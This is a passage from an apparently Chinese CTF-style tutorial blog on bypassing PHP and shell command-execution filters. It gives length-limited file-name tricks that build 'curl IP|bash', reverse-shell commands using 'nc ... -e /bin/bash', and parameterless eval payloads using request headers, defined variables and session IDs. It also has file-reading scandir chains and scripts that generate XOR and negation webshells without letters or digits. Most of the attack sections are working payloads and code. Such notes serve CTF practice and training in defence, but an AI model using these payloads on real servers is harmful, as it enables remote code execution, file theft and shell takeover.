<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">ls</span>\\</span><br><span class="line"><span class="comment">#因为ls的顺序会把字符串ls\放到最后导致命令顺序错误，先构造一个字符开头_的文件放进去，字符&gt;数字&gt;字符串,都有特殊字符的按时间顺序，先创建的在前</span></span><br><span class="line"><span class="built_in">ls</span>&gt;_</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;y <span class="comment">#这时候的ls为&#x27;（空格）-t&gt;y _ ls\&#x27;</span></span><br><span class="line"><span class="built_in">ls</span>&gt;&gt;_ <span class="comment">#追加内容到ls\\之后，即可执行ls -t&gt;y,后面的_ ls\不影响代码执行</span></span><br></pre></td></tr></table></figure>

<p>步骤二：构造curl 192.168.1.161|bash</p>
<p>从后往前</p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png"></p>
<p>执行代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh _ <span class="comment">#生成y,y就是所要执行的语句</span></span><br><span class="line">sh y <span class="comment">#执行语句</span></span><br></pre></td></tr></table></figure>

<p>搭建一个server</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> index.html</span><br><span class="line">vim index.html <span class="comment">#输入nc 192.168.x.x 7777 -e /bin/bash</span></span><br><span class="line">python -m http.server 80 <span class="comment">#访问192.168.x.x即可</span></span><br><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>

<h3 id="四、长度为四的绕过"><a href="#四、长度为四的绕过" class="headerlink" title="四、长度为四的绕过"></a>四、长度为四的绕过</h3><p>新的问题：ls&gt;&gt;_ 超过四个</p>
<p>步骤一：构造ls -t&gt;g<br>步骤二：构造一个反弹shell curl 0xC0A801A1|bash 16进制地址</p>
<p>*:相当于$(dir *)执行第一个文件名，后面的作为参数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;t-</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;<span class="built_in">dir</span> <span class="comment">#dir g&gt; sl t- 按照字母顺序排序,这样rev之后顺序不对，所以在-t后加一个h参数(显示时间)，来保证-t在中间</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改后的代码</span></span><br><span class="line">&gt;\;g <span class="comment">#这里的分号(实体化)是用来防止其他自带文件名的影响命令执行</span></span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;<span class="built_in">dir</span></span><br><span class="line">*&gt;v	<span class="comment">#执行dir命令(加了空格)，输出g&gt; ht- sl到v文件</span></span><br><span class="line"><span class="comment">#rev v 得到正向命令，但是长度大于4</span></span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x <span class="comment">#*是通配符，前能匹配rev，后能执行v,输出rev v到x,x就是正向的命令ls -th&gt;g</span></span><br></pre></td></tr></table></figure>

<p>步骤二：十六进制地址编码</p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/2.png"></p>
<h2 id="十二、无参数命令执行"><a href="#十二、无参数命令执行" class="headerlink" title="十二、无参数命令执行"></a>十二、无参数命令执行</h2><p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png"></p>
<p>正则表达式</p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/5.png"></p>
<p>只有a()的括号里面没有内容的时候才会执行，(?R)代表递归，a(b())嵌套也会执行</p>
<h3 id="1-请求头绕过"><a href="#1-请求头绕过" class="headerlink" title="1.请求头绕过"></a>1.请求头绕过</h3><p>getallheaders()：获取所有http请求标头,无回显，需要用print_r()括住，与我们提交的相反</p>
<p>php&gt;&#x3D;5.4 or php7</p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/6.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(); <span class="comment">#取最后一行，也就是我们发送报文的第一行host</span></span><br><span class="line"><span class="title function_ invoke__">pos</span>(); <span class="comment">#取第一行，也就是我们发送报文的最后一行connection</span></span><br><span class="line"><span class="comment">#把最后一行改成想要执行的命令system(&#x27;cat flag&#x27;)</span></span><br><span class="line">?code=<span class="keyword">eval</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">getallheaders</span>()));</span><br></pre></td></tr></table></figure>

<p>可以自己创一个头</p>
<p>可以用apache_request_headers()替换,仅当服务器是apache搭建时可用</p>
<h3 id="2-无参数全局变量RCE"><a href="#2-无参数全局变量RCE" class="headerlink" title="2.无参数全局变量RCE"></a>2.无参数全局变量RCE</h3><p>适用于php5&#x2F;7</p>
<p>get_defined_vars() 返回所有已定义变量的值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">get_defined_vars</span>()));&amp;cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="comment">#再取一个end即可单独得到cmd,改成eval即可执行指令</span></span><br><span class="line">?code=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/9.png"></p>
<p>可以把cmd(可更改)插入数组</p>
<h3 id="3-无参数session-RCE-php5"><a href="#3-无参数session-RCE-php5" class="headerlink" title="3.无参数session RCE -php5"></a>3.无参数session RCE -php5</h3><p>session_start()：启用新回话&#x2F;重用现有会话</p>
<p>sesion_id(session_start())：返回PHPSESSID的值</p>
<p>show_source()可以看到值，print_r()不行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="keyword">eval</span>(<span class="title function_ invoke__">sesion_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br><span class="line"><span class="comment">#burp抓包更改Cookie里的PHPSESSID为命令，有特殊字符的命令无法执行，使用hex编码(hackbar)</span></span><br><span class="line">?cmd=<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">sesion_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br></pre></td></tr></table></figure>

<h3 id="4-scandir读取"><a href="#4-scandir读取" class="headerlink" title="4.scandir读取"></a>4.scandir读取</h3><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="title function_ invoke__">scandir</span>()</span><br><span class="line">    <span class="comment">#无回显，括号内.为显示当前目录文件</span></span><br><span class="line"><span class="number">2</span>.<span class="title function_ invoke__">getcwd</span>() <span class="comment">#取得当前工作目录（php4）</span></span><br><span class="line"><span class="number">3</span>.<span class="title function_ invoke__">current</span>() <span class="comment">#相当于pos(),取第一个内容的值</span></span><br><span class="line"><span class="number">4</span>.<span class="title function_ invoke__">next</span>() <span class="comment">#取第二个内容的值</span></span><br><span class="line"><span class="number">5</span>.<span class="title function_ invoke__">array_reverse</span>() <span class="comment">#反向排列数组/文件</span></span><br><span class="line"><span class="number">6</span>.<span class="title function_ invoke__">array_flip</span>() <span class="comment">#将键和值对调，配合array_rand()</span></span><br><span class="line"><span class="number">7</span>.<span class="title function_ invoke__">array_rand</span>() <span class="comment">#随机取得数组的一个键名</span></span><br><span class="line"><span class="number">8</span>.<span class="title function_ invoke__">chdir</span>() <span class="comment">#同cd</span></span><br><span class="line"><span class="number">9</span>.<span class="title function_ invoke__">strrev</span>() <span class="comment">#翻转给定字符串</span></span><br><span class="line"><span class="number">10</span>.<span class="title function_ invoke__">crypt</span>() <span class="comment">#加密</span></span><br><span class="line"><span class="number">11</span>.<span class="title function_ invoke__">hebrevc</span>() <span class="comment">#从右至左的流转换为从左至右的流</span></span><br><span class="line"><span class="number">12</span>.<span class="title function_ invoke__">localeconv</span>() <span class="comment">#得到的数组的第一个的值是&#x27;.&#x27;,可用pos(localconv())代替&#x27;.&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"><span class="comment">#把最后一行翻转到第一行，再取第一行</span></span><br><span class="line"><span class="comment">#pos(localconv())也可以用getcwd()，使用的是绝对路径</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读取上级文件</span></span><br><span class="line"><span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()) <span class="comment">#上一级目录</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br><span class="line"><span class="comment">#但是这里不能show_source读取文件，因为show_source默认为网站目录，使用chdir转换目录</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))))));</span><br><span class="line">#如果要读取的文件不在开头末尾，用rand</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())))));   </span><br><span class="line">#注意外面的<span class="title function_ invoke__">dirname</span>()由于不能再向上读取，读取到的是自己，也就是.</span><br></pre></td></tr></table></figure>

<p>另外两种读取方法：（没用getcwd(),dirname())</p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/10.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读取根目录 -&gt;构造/</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/11.png"></p>
<p>取第一个字符：ord()只能随机一个字符hex编码，chr()只能随机一个字符解码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))));</span><br><span class="line"><span class="comment">#有可能选到/,读取成功</span></span><br><span class="line"><span class="comment">#读取文件(随机),可以不固定，如果固定必须加dirname()</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))))));</span><br><span class="line"><span class="comment">#用burp-&gt;intruder-&gt;改一个无关的值-&gt;numbers来大量随机</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))))))));</span><br><span class="line"><span class="comment">#因为可能随机到..导致目录变更，用chdir固定</span></span><br></pre></td></tr></table></figure>

<h2 id="十三、无字母数字命令执行"><a href="#十三、无字母数字命令执行" class="headerlink" title="十三、无字母数字命令执行"></a>十三、无字母数字命令执行</h2><h3 id="一、异或运算绕过"><a href="#一、异或运算绕过" class="headerlink" title="一、异或运算绕过"></a>一、异或运算绕过</h3><p>原理：两个字符异或运算是ascii码的二进制按位进行异或运算，得到新字符。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&quot; &quot;</span>^<span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="variable">$_</span>(); <span class="comment">#执行命令</span></span><br><span class="line">?cmd=<span class="variable">$_</span>=<span class="string">&quot;+(+).&amp;/&quot;</span>^<span class="string">&quot;[@[@@@@&quot;</span>;<span class="variable">$_</span>();	<span class="comment">#加号要url编码，执行phpinfo()</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php5 拼接assert($_POST[&#x27;_&#x27;]);</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">	<span class="variable">$b</span>=<span class="string">&#x27;_POST&#x27;</span>;</span><br><span class="line">	<span class="variable">$c</span>=<span class="variable">$$b</span>;</span><br><span class="line">	<span class="variable">$a</span>(<span class="variable">$c</span>[<span class="string">&#x27;_&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure>

<p>异或运算得到</p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/12.png"></p>
<p>记得编码，配合post方法_&#x3D;nc 192.168.x.x -e &#x2F;bin&#x2F;bash;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php7不能用assert</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;_POST&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$$_</span>;</span><br><span class="line">`<span class="variable">$__</span>[<span class="string">&#x27;_&#x27;</span>]`; <span class="comment">#反引号</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#必须用反弹shell</span></span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;phpinfo&quot;</span>; <span class="comment">#改成你的命令</span></span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span>=<span class="number">0</span>;<span class="variable">$num</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$num</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">33</span>;<span class="variable">$x</span>&lt;=<span class="number">126</span>;<span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">33</span>;<span class="variable">$y</span>&lt;=<span class="number">126</span>;<span class="variable">$y</span>++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;异或运算第一部分： &quot;</span>.<span class="variable">$result1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;异或运算第二部分： &quot;</span>.<span class="variable">$result2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">#在这里验证一下</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;+(+).&amp;/&quot;</span>^<span class="string">&quot;[@[@@@@&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="二、取反绕过"><a href="#二、取反绕过" class="headerlink" title="二、取反绕过"></a>二、取反绕过</h3><p>~（      ）：二进制取反</p>
<p>~（urldecode(%9e)); &#x3D; a	因为9e超过了16进制最大，用url编码解码</p>
<p>中文字符：’极’ -&gt; e69e81 -&gt;有三位（0,1,2），每位两个字母，所以$a{1}就是9e，~($a{1})是a</p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/13.png"></p>
<p>脚本neg.php，所有的中文都是取{1}</p>
<p>或者直接用url编码assert post</p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/14.png"></p>
<p>php7用反引号！<code>$_POST[_]</code>，无回显，反弹shell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$shell</span> =<span class="string">&quot;phpinfo&quot;</span> ; <span class="comment">#改成你的命令</span></span><br><span class="line"><span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> =<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$word</span> = <span class="string">&quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺</span></span><br><span class="line"><span class="string">木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引</span></span><br><span class="line"><span class="string">丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们</span></span><br><span class="line"><span class="string">仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾</span></span><br><span class="line"><span class="string">扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传</span></span><br><span class="line"><span class="string">乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅</span></span><br><span class="line"><span class="string">字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖</span></span><br><span class="line"><span class="string">护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我</span></span><br><span class="line"><span class="string">乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟</span></span><br><span class="line"><span class="string">没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖</span></span><br><span class="line"><span class="string">拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚</span></span><br><span class="line"><span class="string">旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿</span></span><br><span class="line"><span class="string">胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试</span></span><br><span class="line"><span 